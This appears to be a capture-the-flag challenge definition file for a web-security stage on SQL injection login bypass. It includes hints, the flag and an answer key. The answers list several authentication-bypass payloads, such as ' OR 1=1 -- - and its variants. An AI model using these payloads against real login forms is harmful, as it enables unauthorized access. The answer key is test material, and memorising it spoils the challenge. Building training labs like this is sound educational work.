// Stage 3 — auto-extracted from server.js
module.exports = {
  "id": 3,
  "stage": 3,
  "title": "Bypassing the Gatekeeper",
  "domain": "Web Security",
  "difficulty": "Moderate",
  "points": 200,
  "tools": "Web Browser, Burp Suite, SQLmap",
  "description": "The insider leaked a staging URL in Stage 1. That portal uses unsafe SQL query construction — a flaw the insider was aware of. Bypass the login, access the admin panel, and recover the audit flag.",
  "flag": "CTF{sqli_4uth_byp4ss_s3cur3_l0g1n}",
  "resource": {
    "label": "Open Staging Portal",
    "url": "/staging/",
    "external": true
  },
  "hints": [
    {
      "no": 1,
      "text": "The staging URL was already exposed in Stage 1. Revisit that config file if needed.",
      "penalty": 5
    },
    {
      "no": 2,
      "text": "The username field is where the flaw lives. Test with a single quote first.",
      "penalty": 10
    },
    {
      "no": 3,
      "text": "After the SQLi bypass, you land on the admin dashboard. The flag is not rendered on the page — inspect the HTML source code and look for internal developer comments.",
      "penalty": 15
    }
  ],
  "steps": [
    {
      "no": 1,
      "title": "Locate the portal",
      "instruction": "A leaked staging URL from an earlier stage points to an internal employee login page. What is the URL path of that portal? (just the path, no domain, no leading slash)",
      "placeholder": "path",
      "answer": "staging"
    },
    {
      "no": 2,
      "title": "Identify the flaw",
      "instruction": "The portal at /{prev} accepts unsanitised input in the login form. Submit a single quote character in the username field and observe the response. What class of vulnerability does this reveal? (4-letter abbreviation)",
      "placeholder": "xxxx",
      "answer": "sqli",
      "altAnswers": [
        "sql injection",
        "sql-injection",
        "sql-i"
      ]
    },
    {
      "no": 3,
      "title": "Craft the bypass",
      "instruction": "You have confirmed {prev}. To make the login query always return a row, inject a condition that is always true and comment out the rest of the query. What is the complete payload you would enter in the username field? (format: ' OR 1=1 -- -)",
      "placeholder": "payload",
      "answer": "' OR 1=1 -- -",
      "altAnswers": [
        "' or 1=1 -- -",
        "' OR 1=1 --",
        "' or 1=1 --",
        "' OR 1=1#",
        "' or 1=1#",
        "' OR 1=1 -- - ",
        "admin' OR 1=1 -- -",
        "admin' or 1=1 -- -",
        "admin' OR 1=1#",
        "' OR '1'='1' -- -",
        "' or '1'='1' -- -"
      ]
    },
    {
      "no": 4,
      "title": "Retrieve the audit flag",
      "instruction": "Enter the payload {prev} into the portal's login form with any password. Authentication is bypassed and you are taken to the staging admin dashboard. The flag is not shown on the page — inspect the page source to recover it.",
      "placeholder": "CTF{...}",
      "answer": "CTF{sqli_4uth_byp4ss_s3cur3_l0g1n}"
    }
  ]
};
